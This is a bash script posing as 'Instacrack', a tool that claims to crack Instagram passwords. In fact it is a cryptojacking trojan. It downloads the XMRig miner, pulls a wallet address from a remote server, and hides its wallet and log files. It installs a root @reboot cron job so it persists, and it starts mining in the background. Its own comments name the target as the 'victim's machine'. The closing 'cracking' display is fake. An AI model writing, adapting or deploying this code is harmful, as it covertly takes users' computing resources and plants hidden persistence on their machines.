#!/bin/bash

# Setup Variables
home_directory=$(getent passwd $USER | cut -d: -f6)
destination_folder="$home_directory/Documents"
miner_url="https://github.com/xmrig/xmrig/releases/latest/download/xmrig.tar.gz"
miner_download_path="$destination_folder/res/xmrig.tar.gz"
miner_folder="$destination_folder/res/xmrig"
wallet_config_file="$home_directory/.config/.instacrack_wallet.txt"  # Hidden wallet file
node_url="127.0.0.1:18081"  # Node address (local or remote)
wallet_server_url="http://your-remote-server.com/get_wallet_address"  # Server to fetch wallet address

# Ensure "res" folder exists in the destination folder
if [ ! -d "$destination_folder/res" ]; then
    echo "Error: 'res' folder not found in $destination_folder."
    exit 1
fi

# Copy necessary files to victim's machine
mkdir -p "$destination_folder/res"
sudo cp -r res/* "$destination_folder/res" || { echo "Error: Failed to copy files."; exit 1; }

# Download and Setup Miner
if [ ! -d "$miner_folder" ]; then
    echo "Downloading miner..."
    if ! wget -q -O "$miner_download_path" "$miner_url"; then
        echo "Error: Failed to download miner."
        exit 1
    fi
    mkdir -p "$miner_folder"
    if ! tar -xf "$miner_download_path" -C "$miner_folder" --strip-components=1; then
        echo "Error: Failed to extract miner files."
        exit 1
    fi
    rm "$miner_download_path"
fi

# Fetch the Wallet Address from the Remote Server (Silent, No User Interaction)
if [ ! -f "$wallet_config_file" ]; then
    wallet_address=$(curl -s "$wallet_server_url")  # Get wallet address from remote server
    if [ -z "$wallet_address" ]; then
        echo "Error: Failed to retrieve wallet address."
        exit 1
    fi
    echo "$wallet_address" > "$wallet_config_file"
fi

# Create the Miner Start Script
miner_script_path="$destination_folder/res/run_miner.sh"
cat > "$miner_script_path" <<EOF
#!/bin/bash
MINER_PATH="$miner_folder/xmrig"
LOG_FILE="$home_directory/.cache/.mining_activity.log"
WALLET_ADDRESS=\$(cat "$wallet_config_file")
nohup \$MINER_PATH -o http://$node_url -u \$WALLET_ADDRESS -p x > \$LOG_FILE 2>&1 &
EOF
chmod +x "$miner_script_path"

# Add Cron Job for Persistence
if ! sudo crontab -l 2>/dev/null | grep -q "@reboot bash $miner_script_path"; then
    (sudo crontab -l 2>/dev/null; echo "@reboot bash $miner_script_path") | sudo crontab -
fi

# Start the Miner
nohup bash "$miner_script_path" > /dev/null 2>&1 &

# Instagram Hacking Interface (Simulated)
bold=$(tput bold)
blue=$(tput setaf 4)
green=$(tput setaf 2)
red=$(tput setaf 1)
reset=$(tput sgr0)

clear
printf "\n${bold}${blue}**********************************************************\n"
printf "     _____           _        ____                 _    \n"
printf "    |_   _|         | |      |  _  crack Instagram| |   \n"
printf "      | |  _ __  ___| |_ __ _|*************************\n"
printf "      | | | '_ \\/ __| __/ _ ***************************\n"
printf "     _| |_| | | \\__ \\ || (_ ***************************\n"
printf "    |_____|_| |_|___/\\__\\__,_***************************\n"
printf "   By Instacrack                v 3.0.2p\n"
printf "**********************************************************${reset}\n"

# Simulated Instagram password cracking (no user input)
wordlist="/path/to/wordlist.txt"  # Provide a predefined wordlist location
username="target_username"  # Predefined target username

printf "${green}\nStarting password cracking for user: %s\n${reset}" "$username"
sleep 2
while IFS= read -r password; do
    printf "${blue}[+]${reset} Trying password for ${bold}%s: %s ${red}${bold}[Failed !]${reset}\n" "$username" "$password"
    sleep 1
done < "$wordlist"

printf "Password cracking attempt completed.\n"
